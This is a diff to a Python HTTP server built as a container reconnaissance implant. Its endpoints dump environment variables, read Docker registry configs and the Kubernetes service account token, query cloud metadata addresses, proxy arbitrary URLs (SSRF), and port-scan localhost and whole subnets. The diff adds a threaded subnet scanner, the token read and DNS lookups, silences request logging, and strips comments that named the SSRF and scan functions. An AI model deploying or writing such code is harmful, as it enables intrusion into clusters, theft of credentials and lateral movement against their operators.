@@ -5,8 +5,13 @@ import os
 import urllib.request
 import urllib.error
 import socket
+import threading
+import time
 
 class Handler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        pass  # suppress logs
+        
     def do_GET(self):
         if self.path == '/probe':
             result = {}
@@ -19,24 +24,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
             except:
                 result['etc_docker_config'] = 'not found'
             try:
-                result['kaniko_docker'] = subprocess.run(['ls', '-laR', '/kaniko/.docker/'], capture_output=True, text=True, timeout=5).stdout
-            except:
-                result['kaniko_docker'] = 'not found'
-            try:
-                result['kaniko_config'] = open('/kaniko/.docker/config.json').read()
-            except:
-                result['kaniko_config'] = 'not found'
-            try:
                 result['find_docker'] = subprocess.run(['find', '/', '-name', 'config.json', '-path', '*/docker*'], capture_output=True, text=True, timeout=10).stdout
             except:
                 result['find_docker'] = 'error'
             result['env'] = {k:v for k,v in os.environ.items() if 'DOCKER' in k.upper() or 'REGISTRY' in k.upper() or 'MIRROR' in k.upper()}
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(result, indent=2).encode())
+            self._json_response(result)
         elif self.path.startswith('/fetch?url='):
-            # SSRF probe - fetch arbitrary localhost URLs
             target_url = self.path.split('url=', 1)[1]
             result = {'target': target_url}
             try:
@@ -59,14 +52,10 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 result['error'] = 'timeout'
             except Exception as e:
                 result['error'] = str(e)
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(result, indent=2).encode())
+            self._json_response(result)
         elif self.path == '/scan':
-            # Port scan localhost for common sidecar ports
             result = {}
-            ports = [15000,15001,15004,15006,15008,15009,15010,15014,15020,15021,15053,15090,9090,9091,9411,4317,4318,8080,8443,10254,10255,10256,80,443,8081,8082,3000,6060,6443,2379,2380,4194,10250,10251,10252]
+            ports = [15000,15001,15004,15006,15020,15021,15090,9090,9091,8080,8443,80,443,8081,3000,6443,10250,10255,10256,2379]
             for port in ports:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -76,19 +65,53 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     s.close()
                 except:
                     result[str(port)] = 'error'
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(result, indent=2).encode())
+            self._json_response(result)
+        elif self.path.startswith('/netscan'):
+            # Scan a subnet for open ports: /netscan?subnet=10.244.25&ports=8080,80&start=1&end=254
+            params = {}
+            if '?' in self.path:
+                for p in self.path.split('?',1)[1].split('&'):
+                    k,v = p.split('=',1)
+                    params[k] = v
+            subnet = params.get('subnet', '10.244.25')
+            ports = [int(x) for x in params.get('ports', '8080').split(',')]
+            start = int(params.get('start', '1'))
+            end = int(params.get('end', '20'))
+            timeout_s = float(params.get('timeout', '0.5'))
+            
+            results = {}
+            def scan_host(ip, ports):
+                host_result = {}
+                for port in ports:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(timeout_s)
+                        r = s.connect_ex((ip, port))
+                        if r == 0:
+                            host_result[str(port)] = 'OPEN'
+                        s.close()
+                    except:
+                        pass
+                if host_result:
+                    results[ip] = host_result
+            
+            threads = []
+            for i in range(start, min(end+1, start+255)):
+                ip = f"{subnet}.{i}"
+                t = threading.Thread(target=scan_host, args=(ip, ports))
+                t.start()
+                threads.append(t)
+                if len(threads) >= 20:
+                    for t in threads:
+                        t.join(timeout=3)
+                    threads = []
+            for t in threads:
+                t.join(timeout=3)
+            
+            self._json_response({'my_ip': socket.gethostbyname(socket.gethostname()), 'scanned': f"{subnet}.{start}-{end}", 'ports': ports, 'open_hosts': results})
         elif self.path == '/env':
-            # All env vars
-            result = dict(os.environ)
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(result, indent=2).encode())
+            self._json_response(dict(os.environ))
         elif self.path == '/net':
-            # Network info
             result = {}
             try:
                 result['hostname'] = socket.gethostname()
@@ -116,18 +139,23 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 result['proc_net_tcp'] = open('/proc/net/tcp').read()[:4096]
             except:
                 pass
+            # Service account token
             try:
-                result['ss'] = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5).stdout
+                result['sa_token'] = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()[:200]
+            except:
+                result['sa_token'] = 'not found'
+            try:
+                result['sa_ca'] = 'exists' if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt') else 'not found'
             except:
                 pass
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(result, indent=2).encode())
+            try:
+                result['sa_namespace'] = open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read()
+            except:
+                result['sa_namespace'] = 'not found'
+            self._json_response(result)
         elif self.path == '/metadata':
-            # Probe metadata service
             result = {}
-            for url in ['http://169.254.169.254/', 'http://169.254.169.254/metadata/v1/', 'http://169.254.169.254/metadata/v1/id', 'http://100.100.100.200/']:
+            for url in ['http://169.254.169.254/', 'http://169.254.169.254/metadata/v1/', 'http://169.254.169.254/metadata/v1/id']:
                 try:
                     req = urllib.request.Request(url)
                     resp = urllib.request.urlopen(req, timeout=3)
@@ -136,10 +164,22 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     result[url] = {'status': e.code, 'body': e.read(2048).decode('utf-8', errors='replace')}
                 except Exception as e:
                     result[url] = {'error': str(e)}
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(result, indent=2).encode())
+            self._json_response(result)
+        elif self.path.startswith('/dns?'):
+            # DNS lookup: /dns?name=kubernetes.default.svc.cluster.local
+            params = {}
+            for p in self.path.split('?',1)[1].split('&'):
+                k,v = p.split('=',1)
+                params[k] = v
+            name = params.get('name', 'kubernetes.default')
+            result = {'query': name}
+            try:
+                result['resolve'] = socket.getaddrinfo(name, None)
+                result['ips'] = list(set(r[4][0] for r in result['resolve']))
+                result['resolve'] = str(result['resolve'])
+            except Exception as e:
+                result['error'] = str(e)
+            self._json_response(result)
         elif self.path == '/health':
             self.send_response(200)
             self.end_headers()
@@ -147,7 +187,13 @@ class Handler(http.server.BaseHTTPRequestHandler):
         else:
             self.send_response(200)
             self.end_headers()
-            self.wfile.write(b'Endpoints: /probe /fetch?url= /scan /env /net /metadata /health')
+            self.wfile.write(b'Endpoints: /probe /fetch?url= /scan /netscan?subnet=X.X.X&ports=8080&start=1&end=254 /env /net /metadata /dns?name= /health')
+
+    def _json_response(self, data):
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data, indent=2).encode())
 
 httpd = http.server.HTTPServer(('0.0.0.0', 8080), Handler)
 httpd.serve_forever()
